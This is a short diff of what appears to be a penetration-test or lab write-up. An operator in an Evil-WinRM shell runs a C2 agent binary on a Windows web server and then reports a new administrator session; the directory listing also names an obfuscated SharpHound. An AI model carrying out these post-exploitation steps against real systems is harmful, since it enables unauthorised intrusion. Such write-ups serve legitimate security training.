@@ -253,11 +253,15 @@ Info: Upload successful!
 
 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
--a----          4/8/2026   6:39 PM         734720 obf_sharphound.exe
--a----          4/8/2026   6:36 PM        1351680 sharphound.exe
 -a----         4/19/2026   3:30 PM          90112 web-agent.x64.exe
 
 
 *Evil-WinRM* PS C:\Users\svc_webpool\Documents> .\web-agent.x64.exe
 *Evil-WinRM* PS C:\Users\svc_webpool\Documents> 
 ```
+I should now have a session in my C2 client
+
+![](Pasted%20image%2020260419163159.png)
+
+New administrator session on the web server!
+
